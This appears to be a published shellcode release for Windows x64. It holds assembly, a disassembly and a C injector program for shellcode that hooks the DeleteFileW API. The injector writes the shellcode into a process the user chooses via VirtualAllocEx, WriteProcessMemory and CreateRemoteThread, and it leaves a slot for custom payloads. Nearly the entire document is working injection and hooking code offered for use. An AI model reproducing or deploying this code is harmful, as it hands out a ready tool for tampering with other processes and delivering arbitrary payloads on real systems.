/*

	# Title : Windows x64 API Hooking Shellcode
	# Author : Roziul Hasan Khan Shifat
	# Size : 117 bytes
	# Date : 16/10/2017
	# Email : shifath12@gmail.com
	# Tested On : Windows 7 Ultimate x64



*/


/*

This Shellcode hooks DeteleFileW() API
Warning: Do no Use this Shellcode on explorer.exe Otherwise You won't be able to delete file from Recycle Bin

*/



/*


section .text
	global _start
_start:

xor rdx,rdx
mov rax,[gs:rdx+0x60] ;PPEB
mov rax,[rax+24] ;PPEB->Ldr
mov rsi,[rax+32] ;Ldr->InMemOrderModuleList.Flink
mov rax,[rsi]
mov rsi,[rax]

mov rdi,[rsi+32] ;rdi=kernel32.dll base Address

;---------------------------------------------------------------
xor rsi,rsi
mov si,0x29f0
add rsi,rdi ;rsi=VirtualProtect()

;----------------------------------
;This Part is Important

xor r12,r12
mov r12w,0xa2b0  ;0x0000a2b0 is Relative Address of DeleteFileW()
add r12,rdi ;r12=DeleteFileW()

;---------------------------------------------------
;Changing memory attribute
mov rcx,r12
push rdx

mov dl,9

pop r8
mov r8b,0x40
sub rsp,4
lea r14,[rsp]
mov r9,r14
call rsi

;--------------------------------------------------------
mov [r12],byte 0xe9
jmp shellcode

inj:
pop rdx
sub rdx,r12
sub rdx,5
mov [r12+1],rdx

xor rdx,rdx
mov dl,9
mov rcx,r12
mov r8d,dword [r14]
mov r9,r14

call rsi
add rsp,4
ret



shellcode:
call inj
;This is My own shellcode
db 0x48,0x31,0xd2,0x65,0x48,0x8b,0x42,0x60,0x48,0x8b,0x40,0x18,0x48,0x8b,0x70,0x20,0x48,0x8b,0x06,0x48,0x8b,0x30,0x48,0x8b,0x7e,0x20,0x68,0x90,0x65,0x01,0x0a,0x80,0x74,0x24,0x03,0x0a,0x5b,0x48,0x01,0xfb,0x52,0x52,0x48,0xb8,0x75,0x73,0x65,0x72,0x33,0x32,0x2e,0x64,0x48,0x89,0x04,0x24,0x66,0xc7,0x44,0x24,0x08,0x6c,0x6c,0x48,0x8d,0x0c,0x24,0x48,0x83,0xec,0x58,0xff,0xd3,0x68,0xb8,0x12,0x07,0x0a,0x80,0x74,0x24,0x03,0x0a,0x5b,0x48,0x01,0xc3,0x48,0x31,0xc9,0x6a,0x10,0x41,0x59,0x51,0x51,0x48,0xba,0x41,0x50,0x49,0x20,0x42,0x6c,0x6f,0x63,0x48,0x89,0x14,0x24,0xc7,0x44,0x24,0x08,0x6b,0x65,0x64,0x21,0x48,0x8d,0x14,0x24,0x52,0x41,0x58,0x48,0x83,0xec,0x58,0x48,0x83,0xec,0x58,0xff,0xd3,0x90,0x48,0x31,0xd2,0x66,0xba,0x28,0x01,0x48,0x01,0xd4,0xc3













*/



/*


apiint.obj:     file format pe-x86-64


Disassembly of section .text:

0000000000000000 <_start>:
   0:	48 31 d2             	xor    %rdx,%rdx
   3:	65 48 8b 42 60       	mov    %gs:0x60(%rdx),%rax
   8:	48 8b 40 18          	mov    0x18(%rax),%rax
   c:	48 8b 70 20          	mov    0x20(%rax),%rsi
  10:	48 8b 06             	mov    (%rsi),%rax
  13:	48 8b 30             	mov    (%rax),%rsi
  16:	48 8b 7e 20          	mov    0x20(%rsi),%rdi
  1a:	48 31 f6             	xor    %rsi,%rsi
  1d:	66 be f0 29          	mov    $0x29f0,%si
  21:	48 01 fe             	add    %rdi,%rsi
  24:	4d 31 e4             	xor    %r12,%r12
  27:	66 41 bc b0 a2       	mov    $0xa2b0,%r12w
  2c:	49 01 fc             	add    %rdi,%r12
  2f:	4c 89 e1             	mov    %r12,%rcx
  32:	52                   	push   %rdx
  33:	b2 09                	mov    $0x9,%dl
  35:	41 58                	pop    %r8
  37:	41 b0 40             	mov    $0x40,%r8b
  3a:	48 83 ec 04          	sub    $0x4,%rsp
  3e:	4c 8d 34 24          	lea    (%rsp),%r14
  42:	4d 89 f1             	mov    %r14,%r9
  45:	ff d6                	callq  *%rsi
  47:	41 c6 04 24 e9       	movb   $0xe9,(%r12)
  4c:	eb 22                	jmp    70 <shellcode>

000000000000004e <inj>:
  4e:	5a                   	pop    %rdx
  4f:	4c 29 e2             	sub    %r12,%rdx
  52:	48 83 ea 05          	sub    $0x5,%rdx
  56:	49 89 54 24 01       	mov    %rdx,0x1(%r12)
  5b:	48 31 d2             	xor    %rdx,%rdx
  5e:	b2 09                	mov    $0x9,%dl
  60:	4c 89 e1             	mov    %r12,%rcx
  63:	45 8b 06             	mov    (%r14),%r8d
  66:	4d 89 f1             	mov    %r14,%r9
  69:	ff d6                	callq  *%rsi
  6b:	48 83 c4 04          	add    $0x4,%rsp
  6f:	c3                   	retq

0000000000000070 <shellcode>:
  70:	e8 d9 ff ff ff       	callq  4e <inj>
  75:	48 31 d2             	xor    %rdx,%rdx
  78:	65 48 8b 42 60       	mov    %gs:0x60(%rdx),%rax
  7d:	48 8b 40 18          	mov    0x18(%rax),%rax
  81:	48 8b 70 20          	mov    0x20(%rax),%rsi
  85:	48 8b 06             	mov    (%rsi),%rax
  88:	48 8b 30             	mov    (%rax),%rsi
  8b:	48 8b 7e 20          	mov    0x20(%rsi),%rdi
  8f:	68 90 65 01 0a       	pushq  $0xa016590
  94:	80 74 24 03 0a       	xorb   $0xa,0x3(%rsp)
  99:	5b                   	pop    %rbx
  9a:	48 01 fb             	add    %rdi,%rbx
  9d:	52                   	push   %rdx
  9e:	52                   	push   %rdx
  9f:	48 b8 75 73 65 72 33 	movabs $0x642e323372657375,%rax
  a6:	32 2e 64
  a9:	48 89 04 24          	mov    %rax,(%rsp)
  ad:	66 c7 44 24 08 6c 6c 	movw   $0x6c6c,0x8(%rsp)
  b4:	48 8d 0c 24          	lea    (%rsp),%rcx
  b8:	48 83 ec 58          	sub    $0x58,%rsp
  bc:	ff d3                	callq  *%rbx
  be:	68 b8 12 07 0a       	pushq  $0xa0712b8
  c3:	80 74 24 03 0a       	xorb   $0xa,0x3(%rsp)
  c8:	5b                   	pop    %rbx
  c9:	48 01 c3             	add    %rax,%rbx
  cc:	48 31 c9             	xor    %rcx,%rcx
  cf:	6a 10                	pushq  $0x10
  d1:	41 59                	pop    %r9
  d3:	51                   	push   %rcx
  d4:	51                   	push   %rcx
  d5:	48 ba 41 50 49 20 42 	movabs $0x636f6c4220495041,%rdx
  dc:	6c 6f 63
  df:	48 89 14 24          	mov    %rdx,(%rsp)
  e3:	c7 44 24 08 6b 65 64 	movl   $0x2164656b,0x8(%rsp)
  ea:	21
  eb:	48 8d 14 24          	lea    (%rsp),%rdx
  ef:	52                   	push   %rdx
  f0:	41 58                	pop    %r8
  f2:	48 83 ec 58          	sub    $0x58,%rsp
  f6:	48 83 ec 58          	sub    $0x58,%rsp
  fa:	ff d3                	callq  *%rbx
  fc:	90                   	nop
  fd:	48 31 d2             	xor    %rdx,%rdx
 100:	66 ba 28 01          	mov    $0x128,%dx
 104:	48 01 d4             	add    %rdx,%rsp
 107:	c3                   	retq






*/






#include<stdio.h>
#include<windows.h>
#include<tlhelp32.h>
#include<string.h>

unsigned char shellcode[]=\

//Main Shellcode (Interceptor Shellcode)

"\x48\x31\xd2\x65\x48\x8b\x42\x60\x48\x8b\x40\x18\x48\x8b\x70\x20\x48\x8b\x06\x48\x8b\x30\x48\x8b\x7e\x20\x48\x31\xf6\x66\xbe\xf0\x29\x48\x01\xfe\x4d\x31\xe4\x66\x41\xbc\xb0\xa2\x49\x01\xfc\x4c\x89\xe1\x52\xb2\x09\x41\x58\x41\xb0\x40\x48\x83\xec\x04\x4c\x8d\x34\x24\x4d\x89\xf1\xff\xd6\x41\xc6\x04\x24\xe9\xeb\x22\x5a\x4c\x29\xe2\x48\x83\xea\x05\x49\x89\x54\x24\x01\x48\x31\xd2\xb2\x09\x4c\x89\xe1\x45\x8b\x06\x4d\x89\xf1\xff\xd6\x48\x83\xc4\x04\xc3\xe8\xd9\xff\xff\xff"

//Your Custom shellcode

"\x48\x31\xd2\x65\x48\x8b\x42\x60\x48\x8b\x40\x18\x48\x8b\x70\x20\x48\x8b\x06\x48\x8b\x30\x48\x8b\x7e\x20\x68\x90\x65\x01\x0a\x80\x74\x24\x03\x0a\x5b\x48\x01\xfb\x52\x52\x48\xb8\x75\x73\x65\x72\x33\x32\x2e\x64\x48\x89\x04\x24\x66\xc7\x44\x24\x08\x6c\x6c\x48\x8d\x0c\x24\x48\x83\xec\x58\xff\xd3\x68\xb8\x12\x07\x0a\x80\x74\x24\x03\x0a\x5b\x48\x01\xc3\x48\x31\xc9\x6a\x10\x41\x59\x51\x51\x48\xba\x41\x50\x49\x20\x42\x6c\x6f\x63\x48\x89\x14\x24\xc7\x44\x24\x08\x6b\x65\x64\x21\x48\x8d\x14\x24\x52\x41\x58\x48\x83\xec\x58\x48\x83\xec\x58\xff\xd3\x90\x48\x31\xd2\x66\xba\x28\x01\x48\x01\xd4\xc3";



int main()
{
	HANDLE snap,proc,mem;
	DWORD len,l,pid;
	PROCESSENTRY32 ps;


	ps.dwSize=sizeof(ps);
	len=strlen(shellcode);


	snap=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
	if(snap==INVALID_HANDLE_VALUE)
	{
		printf("CreateToolhelp32Snapshot() Failed");
		return 0;
	}


	if(!Process32First(snap,&ps))
	{
		printf("Process32First() Failed");
		return 0;
	}



	do
	{
		printf("%s : %ld\n",ps.szExeFile,ps.th32ProcessID);
	}while(Process32Next(snap,&ps));

	printf("\nEnter Process ID: ");
	scanf("%ld",&pid);


	proc=OpenProcess(PROCESS_ALL_ACCESS,0,pid);

	if(!proc)
	{
		printf("Failed to Open Process");
		return 0;
	}

	mem=VirtualAllocEx(proc,NULL,len,MEM_COMMIT,PAGE_EXECUTE_READWRITE);
	if(!mem)
	{
		printf("Failed to allocate memory in process");
		return 0;
	}

	WriteProcessMemory(proc,mem,shellcode,len,NULL);
	VirtualProtectEx(proc,mem,len,PAGE_EXECUTE_READ,&l);

	CreateRemoteThread(proc,NULL,0,(LPTHREAD_START_ROUTINE)mem,NULL,0,0);
	CloseHandle(proc);

	return 0;
}
